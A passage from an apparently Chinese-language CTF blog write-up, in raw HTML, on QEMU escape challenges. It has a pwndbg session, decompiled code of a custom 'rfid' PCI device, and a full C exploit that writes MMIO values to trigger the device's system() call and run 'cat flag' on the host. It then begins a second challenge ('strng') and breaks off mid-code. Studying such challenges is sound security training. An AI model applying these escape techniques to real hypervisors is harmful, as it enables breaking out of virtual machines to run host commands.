class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/qemu$ ps -aux | grep qemu</span><br><span class="line">or4nge     977  4.3  0.8 375628 138068 pts/0   Sl+  14:43   0:10 ./qemu-system-x86_64 -initrd ./initramfs.cpio -kernel ./vmlinuz-4.8.0-52-generic -append console=ttyS0 root=/dev/ram oops=panic panic=1 -monitor /dev/null -m 64M --nographic -L pc-bios -device rfid,id=vda</span><br><span class="line">or4nge    1020  0.0  0.0   4024  2020 pts/1    S+   14:47   0:00 grep --color=auto qemu</span><br><span class="line">or4nge@圈圈:/mnt/d/desktop/qemu$ gdb qemu-system-x86_64</span><br><span class="line">GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">attach pwndbg: loaded 154 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)</span><br><span class="line">Reading symbols from qemu-system-x86_64...</span><br><span class="line">(No debugging symbols found in qemu-system-x86_64)</span><br><span class="line">------- tip of the day (disable with set show-tips off) -------</span><br><span class="line">Use patch &lt;address&gt; &#x27;&lt;assembly&gt;&#x27; to patch an address with given assembly code</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">attach 977</span></span><br><span class="line">Attaching to program: /mnt/d/desktop/qemu/qemu-system-x86_64, process 977</span><br><span class="line">[New LWP 978]</span><br><span class="line">[New LWP 979]</span><br><span class="line">[New LWP 980]</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">0x00007fda04c8bcce in __ppoll (fds=0x5617d5f1f240, nfds=5, timeout=&lt;optimized out&gt;, sigmask=0x0) at ../sysdeps/unix/sysv/linux/ppoll.c:42</span><br><span class="line">42      ../sysdeps/unix/sysv/linux/ppoll.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────</span><br><span class="line">*RAX  0xfffffffffffffdfe</span><br><span class="line">*RBX  0x5617d522b7d0 —▸ 0x5617d50688c0 —▸ 0x5617d5012350 —▸ 0x5617d50124d0 ◂— &#x27;fw_cfg_io&#x27;</span><br><span class="line">*RCX  0x7fda04c8bcce (ppoll+174) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">*RDX  0x7fff06549b90 ◂— 0x0</span><br><span class="line">*RDI  0x5617d5f1f240 ◂— 0x100000000</span><br><span class="line">*RSI  0x5</span><br><span class="line">*R8   0x8</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x0</span><br><span class="line">*R11  0x293</span><br><span class="line">*R12  0x7fff06549fd8 —▸ 0x7fff0654a285 ◂— &#x27;./qemu-system-x86_64&#x27;</span><br><span class="line">*R13  0x7fff06549b90 ◂— 0x0</span><br><span class="line">*R14  0x0</span><br><span class="line">*R15  0x7fda050f9040 (_rtld_global) —▸ 0x7fda050fa2e0 —▸ 0x5617d3600000 ◂— jg 0x5617d3600047</span><br><span class="line">*RBP  0x7fff06549c10 —▸ 0x7fff06549c40 —▸ 0x7fff06549c90 —▸ 0x7fff06549ca0 —▸ 0x7fff06549ec0 ◂— ...</span><br><span class="line">*RSP  0x7fff06549b70 ◂— 0x0</span><br><span class="line">*RIP  0x7fda04c8bcce (ppoll+174) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">──────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────</span><br><span class="line"> ► 0x7fda04c8bcce &lt;ppoll+174&gt;    cmp    rax, -0x1000</span><br><span class="line">   0x7fda04c8bcd4 &lt;ppoll+180&gt;    ja     ppoll+240                &lt;ppoll+240&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7fda04c8bd10 &lt;ppoll+240&gt;    mov    rdx, qword ptr [rip + 0x1010f9]</span><br><span class="line">   0x7fda04c8bd17 &lt;ppoll+247&gt;    neg    eax</span><br><span class="line">   0x7fda04c8bd19 &lt;ppoll+249&gt;    mov    dword ptr fs:[rdx], eax</span><br><span class="line">   0x7fda04c8bd1c &lt;ppoll+252&gt;    mov    eax, 0xffffffff</span><br><span class="line">   0x7fda04c8bd21 &lt;ppoll+257&gt;    jmp    ppoll+182                &lt;ppoll+182&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7fda04c8bcd6 &lt;ppoll+182&gt;    mov    edi, r9d</span><br><span class="line">   0x7fda04c8bcd9 &lt;ppoll+185&gt;    mov    dword ptr [rsp + 8], eax</span><br><span class="line">   0x7fda04c8bcdd &lt;ppoll+189&gt;    call   __pthread_disable_asynccancel</span><br><span class="line">    &lt;__pthread_disable_asynccancel&gt;</span><br><span class="line"></span><br><span class="line">   0x7fda04c8bce2 &lt;ppoll+194&gt;    mov    eax, dword ptr [rsp + 8]</span><br><span class="line">────────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp     0x7fff06549b70 ◂— 0x0</span><br><span class="line">01:0008│-098     0x7fff06549b78 —▸ 0x5617d5f1f240 ◂— 0x100000000</span><br><span class="line">02:0010│-090     0x7fff06549b80 ◂— 0x5</span><br><span class="line">03:0018│-088     0x7fff06549b88 ◂— 0x0</span><br><span class="line">04:0020│ rdx r13 0x7fff06549b90 ◂— 0x0</span><br><span class="line">05:0028│-078     0x7fff06549b98 ◂— 0x2456cfa</span><br><span class="line">06:0030│-070     0x7fff06549ba0 —▸ 0x7fff06549c10 —▸ 0x7fff06549c40 —▸ 0x7fff06549c90 —▸ 0x7fff06549ca0 ◂— ...</span><br><span class="line">07:0038│-068     0x7fff06549ba8 ◂— 0x1eec99408d27f400</span><br><span class="line">──────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0   0x7fda04c8bcce ppoll+174</span><br><span class="line">   1   0x5617d3e3e1bc</span><br><span class="line">   2   0x5617d3e3f1f3</span><br><span class="line">   3   0x5617d3e3f316</span><br><span class="line">   4   0x5617d3a7b4d8</span><br><span class="line">   5   0x5617d3a82a83</span><br><span class="line">   6   0x7fda04b9cd90 __libc_start_call_main+128</span><br><span class="line">   7   0x7fda04b9ce40 __libc_start_main+128</span><br><span class="line">──────────────────────────────[ THREADS (4 TOTAL) ]──────────────────────────────</span><br><span class="line">  ► 1   &quot;qemu-system-x86&quot; stopped: 0x7fda04c8bcce &lt;ppoll+174&gt;</span><br><span class="line">    2   &quot;qemu-system-x86&quot; stopped: 0x7fda04c9188d &lt;syscall+29&gt;</span><br><span class="line">    3   &quot;qemu-system-x86&quot; stopped: 0x7fda04c04117 &lt;__futex_abstimed_wait_cancelable64+231&gt;</span><br><span class="line">    4   &quot;qemu-system-x86&quot; stopped: 0x7fda04c04117 &lt;__futex_abstimed_wait_cancelable64+231&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="数字经济众测-2019-qemu"><a href="#数字经济众测-2019-qemu" class="headerlink" title="[数字经济众测 2019] qemu"></a>[数字经济众测 2019] qemu</h2><p>由于附件没有给出符号表，于是手动对部分比较重要的函数进行了恢复</p><h3 id="恢复代码"><a href="#恢复代码" class="headerlink" title="恢复代码"></a>恢复代码</h3><h4 id="rfid-class-init"><a href="#rfid-class-init" class="headerlink" title="rfid_class_init"></a>rfid_class_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rfid_class_init</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = sub_70031D(a1, <span class="string">&quot;pci-device&quot;</span>, <span class="string">&quot;/home/wang/qemu/hw/misc/myrfid.c&quot;</span>, <span class="number">369LL</span>, <span class="string">&quot;rfid_class_init&quot;</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = sub_571043;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">1056</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">4919</span>;</span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">105</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="rfid-mmio-write"><a href="#rfid-mmio-write" class="headerlink" title="rfid_mmio_write"></a>rfid_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">rfid_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = val;</span><br><span class="line">  v11 = opaque;</span><br><span class="line">  v8 = (addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  v9 = (addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  result = (_BYTE *)((addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int64)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">119</span>;                   <span class="comment">// w</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">115</span>;                   <span class="comment">// s</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">97</span>;                    <span class="comment">// a</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">100</span>;                   <span class="comment">// d</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">65</span>;                    <span class="comment">// A</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">66</span>;                    <span class="comment">// B</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6uLL</span>:</span><br><span class="line">      v10 = (<span class="type">unsigned</span> __int16)v6;</span><br><span class="line">      result = <span class="built_in">memcpy</span>(&amp;command[(<span class="type">unsigned</span> __int16)v6], &amp;n[<span class="number">1</span>], size);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="vnln"><a href="#vnln" class="headerlink" title="vnln"></a>vnln</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vuln</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ((a2 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>) != <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(off_10CC100);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;byte_122FFE0, off_10CC100, v2) )<span class="comment">// off_10cc100 = aWwssadadbaba</span></span><br><span class="line">      system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">270438LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以看出作者连<code>system</code>都给出来了，真的是为了出题而出题。我看主要看<code>vuln</code>函数，只要另其满足<code>2</code>个字符串相同，即可执行<code>system(commond)</code>，于是我们可以利用<code>rfid_mmio_write</code>函数来使其满足条件，最后执行<code>system(&quot;cat flag&quot;)</code>来完成逃逸</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> value)</span>&#123;</span><br><span class="line">      *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfb000000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x000000</span>,<span class="number">0</span>);  <span class="comment">//w  </span></span><br><span class="line">    mmio_write(<span class="number">0x010000</span>,<span class="number">0</span>);  <span class="comment">//w  </span></span><br><span class="line">    mmio_write(<span class="number">0x120000</span>,<span class="number">0</span>);  <span class="comment">//s   </span></span><br><span class="line">    mmio_write(<span class="number">0x130000</span>,<span class="number">0</span>);  <span class="comment">//s </span></span><br><span class="line">    mmio_write(<span class="number">0x240000</span>,<span class="number">0</span>);  <span class="comment">//a  </span></span><br><span class="line">    mmio_write(<span class="number">0x350000</span>,<span class="number">0</span>);  <span class="comment">//d </span></span><br><span class="line">    mmio_write(<span class="number">0x260000</span>,<span class="number">0</span>);  <span class="comment">//a </span></span><br><span class="line">    mmio_write(<span class="number">0x370000</span>,<span class="number">0</span>);  <span class="comment">//d  </span></span><br><span class="line">    mmio_write(<span class="number">0x580000</span>,<span class="number">0</span>);  <span class="comment">//B  </span></span><br><span class="line">    mmio_write(<span class="number">0x490000</span>,<span class="number">0</span>);  <span class="comment">//A  </span></span><br><span class="line">    mmio_write(<span class="number">0x5a0000</span>,<span class="number">0</span>);  <span class="comment">//B </span></span><br><span class="line">    mmio_write(<span class="number">0x4b0000</span>,<span class="number">0</span>);  <span class="comment">//A </span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">0x20</span>] = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line">    mmio_write(<span class="number">0x600000</span>,*(<span class="type">uint64_t</span> *)(&amp;cmd[<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)mmio_mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="湖湘杯-2019-pwn2"><a href="#湖湘杯-2019-pwn2" class="headerlink" title="[湖湘杯 2019] pwn2"></a>[湖湘杯 2019] pwn2</h2><h3 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h3><h4 id="strng-mmio-read"><a href="#strng-mmio-read" class="headerlink" title="strng_mmio_read"></a>strng_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __cdecl <span class="title function_">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="strng-mmio-write"><a href="#strng-mmio-write" class="headerlink" title="strng_mmio_write"></a>strng_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = val;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">        opaque-&gt;regs[<span class="number">3</span>] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">      opaque-&gt;flag = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;regs[v5] = seed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      srand(val);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="strng-pmio-read"><a href="#strng-pmio-read" class="headerlink" title="strng_pmio_read"></a>strng_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __cdecl <span class="title function_">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> v4; <span class="comment">// [rsp+14h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !addr )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;addr;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (opaque-&gt;addr &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;regs[opaque-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="strng-pmio-write"><a href="#strng-pmio-write" class="headerlink" title="strng_pmio_write"></a>strng_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title 